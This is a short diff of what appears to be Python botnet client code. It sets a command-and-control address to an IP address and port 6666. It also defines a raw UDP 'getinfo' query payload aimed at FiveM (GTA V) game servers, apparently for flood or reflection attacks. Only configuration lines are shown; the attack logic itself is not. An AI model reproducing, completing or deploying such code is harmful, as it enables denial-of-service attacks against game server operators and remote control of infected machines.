@@ -2,8 +2,8 @@ import subprocess, random, random, os, time, threading, socket, sys
 from binascii import unhexlify
 
 # Configuration
-C2_ADDRESS  = ""
-C2_PORT     = 1337
+C2_ADDRESS  = "160.176.141.0"
+C2_PORT     = 6666
 
 # Payload para FiveM (servidores de GTA V)
 payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
